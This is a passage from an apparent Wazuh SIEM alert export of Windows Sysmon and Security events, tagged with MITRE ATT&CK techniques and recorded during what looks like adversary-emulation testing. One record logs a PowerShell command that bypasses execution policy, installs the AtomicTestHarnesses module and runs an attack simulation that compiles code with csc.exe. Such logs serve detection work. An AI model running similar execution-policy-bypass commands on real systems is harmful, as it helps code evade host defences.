User: DESKTOP-QGB4EQH\mari""",2,2024-12-22T09:04:56.5205085Z,222133,4236,DESKTOP-QGB4EQH,11,2876,INFORMATION,Microsoft-Windows-Sysmon,8,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 22, 2024 @ 09:04:57.974",EventChannel,1734858298,"Dec 22, 2024 @ 09:04:57.974", , , , , , , , , , , , , , ,564, , , , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{8C1B3A56-0DB8-4B31-82B2-B1C3CFC25F05}\\MicrosoftEdgeUpdateSetup_X86_1.3.195.43.exe, ,{15959494-d637-6767-9101-000000001100},04:56.5, , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\EU8941.tmp\\MicrosoftEdgeUpdateSetup.exe,04:56.5, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,S0qf7ZMBNimV4ECvC4EJ,1,1,192.168.117.129,agent1,4,Maryam,"2024-12-23T09:02:18Z, RulesEngine", ,16384,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},4,Application,0,"""Successfully scheduled Software Protection service for re-start at 2024-12-23T09:02:18Z. Reason: RulesEngine.""",0,2024-12-22T09:07:19.6161057Z,3708,0,DESKTOP-B37GATP,0,0,INFORMATION,Microsoft-Windows-Security-SPP,8,FALSE,3,Software protection service scheduled successfully.,"[""windows"",""windows_application""]",60642,windows_eventchannel,log,"Dec 22, 2024 @ 09:07:20.323",EventChannel,1734858441,"Dec 22, 2024 @ 09:07:20.323", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,TEqf7ZMBNimV4ECvFoHH,1,1,192.168.117.139,window-agent3,3,Maryam, , ,1, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution
UtcTime: 2024-12-22 09:07:24.667
ProcessGuid: {15959494-d6cc-6767-fa01-000000001100}
ProcessId: 14248
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C
Description: Visual C# Command Line Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: csc.exe
CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\mari\AppData\Local\Temp\um0qglc3.cmdline""
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-d5b9-6767-ea38-2b0000000000}
LogonId: 0x2B38EA
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=B9B34E794E751A7A7F2FF32F56F63C463642E09A,MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259
ParentProcessGuid: {15959494-d6c1-6767-d501-000000001100}
ParentProcessId: 11412
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-22T09:07:24.7495403Z,223584,4236,DESKTOP-QGB4EQH,1,2876,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,6,"Powershell script compiling code using CSC.exe, possible malware drop","[""sysmon"",""sysmon_eid1_detections"",""windows""]",92006,windows_eventchannel,log,"Dec 22, 2024 @ 09:07:25.369",EventChannel,1734858446,"Dec 22, 2024 @ 09:07:25.369", , , , , , , , , ,{15959494-d5b9-6767-ea38-2b0000000000}, , , , ,14248, , , , , , , , , , , , ,"[""Compile After Delivery""]","[""T1027.004""]","[""Defense Evasion""]", ,C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe, ,{15959494-d6cc-6767-fa01-000000001100},07:24.7, , ,DESKTOP-QGB4EQH\\mari,csc.exe,Microsoft® .NET Framework,{15959494-d6c1-6767-d501-000000001100},Visual C# Command Line Compiler,"powershell.exe -ExecutionPolicy Bypass -C \""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop\""",0x2b38ea,11412,C:\\Users\\mari\\,"SHA1=B9B34E794E751A7A7F2FF32F56F63C463642E09A,MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution",Microsoft Corporation,"\""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\"" /noconfig /fullpaths @\""C:\\Users\\mari\\AppData\\Local\\Temp\\um0qglc3.cmdline\""",Medium,4.8.9232.0 built by: NET481REL1LAST_C,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,Jkqc7ZMBNimV4ECvjoE-,1,1,192.168.117.129,agent1,4,Maryam, , ,4624, ,0x8020000000000000,{54849625-5478-4994-a5ba-3e3b0328c30d},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-B37GATP$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x29c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-12-22T09:04:31.0486912Z,10639,764,DESKTOP-B37GATP,12544,712,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,23,FALSE,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,windows_eventchannel,log,"Dec 22, 2024 @ 09:04:32.297",EventChannel,1734858273,"Dec 22, 2024 @ 09:04:32.297",0x3e7,WORKGROUP,0x0,%%1833, ,Negotiate, ,0x3e7,Advapi,{00000000-0000-0000-0000-000000000000},SYSTEM,0,%%1842,S-1-5-18,0x29c,C:\\Windows\\System32\\services.exe, ,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-B37GATP$,"[""164.312.b""]","[""10.2.5""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]","[""IV_32.2""]","[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]","[""7.1"",""7.2""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,PEqd7ZMBNimV4ECvWYFq,1,1,192.168.117.139,window-agent3,3,Maryam, , ,11, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-22 09:05:24.561
ProcessGuid: {15959494-d652-6767-a501-000000001100}
ProcessId: 6540
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_3hyuse4o.qhm.ps1
CreationUtcTime: 2024-12-22 09:05:24.561
User: DESKTOP-QGB4EQH\mari""",2,2024-12-22T09:05:24.5684862Z,222350,4236,DESKTOP-QGB4EQH,11,2876,INFORMATION,Microsoft-Windows-Sysmon,9,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 22, 2024 @ 09:05:25.286",EventChannel,1734858326,"Dec 22, 2024 @ 09:05:25.286", , , , , , , , , , , , , , ,6540, , , , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, ,{15959494-d652-6767-a501-000000001100},05:24.6, , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , ,"technique_id=T1059.001,technique_name=PowerShell", , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_3hyuse4o.qhm.ps1,05:24.6, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,Pkqd7ZMBNimV4ECvXYFR,1,1,192.168.117.139,window-agent3,3,Maryam, , ,7, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-22 09:05:32.183
ProcessGuid: {15959494-d63c-6767-9701-000000001100}
ProcessId: 6236
Image: C:\Windows\System32\sppsvc.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\NETWORK SERVICE""",3,2024-12-22T09:05:32.1951150Z,222415,4236,DESKTOP-QGB4EQH,7,2876,INFORMATION,Microsoft-Windows-Sysmon,25,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 22, 2024 @ 09:05:32.340",EventChannel,1734858333,"Dec 22, 2024 @ 09:05:32.340", , , , , , , , , , , , , , ,6236, , , , , , , , , , , , ,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", ,C:\\Windows\\System32\\sppsvc.exe, ,{15959494-d63c-6767-9701-000000001100},05:32.2, , ,NT AUTHORITY\\NETWORK SERVICE,taskschd.dll,Microsoft® Windows® Operating System, ,Task Scheduler COM API, , , , ,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B", ,"technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation, , ,10.0.19041.3636 (WinBuild.160101.0800), , , ,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,TRUE,Valid, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,P0qd7ZMBNimV4ECvXYFR,1,1,192.168.117.139,window-agent3,3,Maryam,"2024-12-23T09:02:32Z, RulesEngine", ,16384,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},4,Application,0,"""Successfully scheduled Software Protection service for re-start at 2024-12-23T09:02:32Z. Reason: RulesEngine.""",0,2024-12-22T09:05:32.7926482Z,7010,0,DESKTOP-QGB4EQH,0,0,INFORMATION,Microsoft-Windows-Security-SPP,6,FALSE,3,Software protection service scheduled successfully.,"[""windows"",""windows_application""]",60642,windows_eventchannel,log,"Dec 22, 2024 @ 09:05:32.433",EventChannel,1734858333,"Dec 22, 2024 @ 09:05:32.433", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,KUqc7ZMBNimV4ECvmYH5,1,1,192.168.117.139,window-agent3,3,Maryam, , ,7, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-22 09:04:40.958
ProcessGuid: {15959494-d5ad-6767-f600-000000001100}
ProcessId: 972
Image: C:\Windows\System32\sppsvc.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\NETWORK SERVICE""",3,2024-12-22T09:04:41.0015993Z,221903,4248,DESKTOP-QGB4EQH,7,2876,INFORMATION,Microsoft-Windows-Sysmon,23,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 22, 2024 @ 09:04:41.581",EventChannel,1734858282,"Dec 22, 2024 @ 09:04:41.581", , , , , , , , , , , , , , ,972, , , , , , , , , , , , ,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", ,C:\\Windows\\System32\\sppsvc.exe, ,{15959494-d5ad-6767-f600-000000001100},04:41.0, , ,NT AUTHORITY\\NETWORK SERVICE,taskschd.dll,Microsoft® Windows® Operating System, ,Task Scheduler COM API, , , , ,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B", ,"technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation, , ,10.0.19041.3636 (WinBuild.160101.0800), , , ,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,TRUE,Valid, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,IEqb7ZMBNimV4ECvzoHP,1,1,192.168.117.139,window-agent3,3,Maryam, , ,7, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-22 09:03:48.527
ProcessGuid: {15959494-d5d2-6767-2401-000000001100}
ProcessId: 6656
Image: C:\Windows\System32\DeviceCensus.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM""",3,2024-12-22T09:03:48.5402665Z,221773,4236,DESKTOP-QGB4EQH,7,2876,INFORMATION,Microsoft-Windows-Sysmon,20,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 22, 2024 @ 09:03:48.542",EventChannel,1734858229,"Dec 22, 2024 @ 09:03:48.542", , , , , , , , , , , , , , ,6656, , , , , , , , , , , , ,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", ,C:\\Windows\\System32\\DeviceCensus.exe, ,{15959494-d5d2-6767-2401-000000001100},03:48.5, , ,NT AUTHORITY\\SYSTEM,taskschd.dll,Microsoft® Windows® Operating System, ,Task Scheduler COM API, , , , ,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B", ,"technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation, , ,10.0.19041.3636 (WinBuild.160101.0800), , , ,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,TRUE,Valid, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,NUqc7ZMBNimV4ECv5IE4,1,1,192.168.117.139,window-agent3,3,Maryam, , ,7, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-22 09:05:00.473
ProcessGuid: {15959494-d63c-6767-9601-000000001100}
ProcessId: 8228
Image: C:\Windows\System32\svchost.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM""",3,2024-12-22T09:05:00.4783110Z,222168,4236,DESKTOP-QGB4EQH,7,2876,INFORMATION,Microsoft-Windows-Sysmon,24,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 22, 2024 @ 09:05:00.990",EventChannel,1734858301,"Dec 22, 2024 @ 09:05:00.990", , , , , , , , , , , , , , ,8228, , , , , , , , , , , , ,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", ,C:\\Windows\\System32\\svchost.exe, ,{15959494-d63c-6767-9601-000000001100},05:00.5, , ,NT AUTHORITY\\SYSTEM,taskschd.dll,Microsoft® Windows® Operating System, ,Task Scheduler COM API, , , , ,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B", ,"technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation, , ,10.0.19041.3636 (WinBuild.160101.0800), , , ,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,TRUE,Valid, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
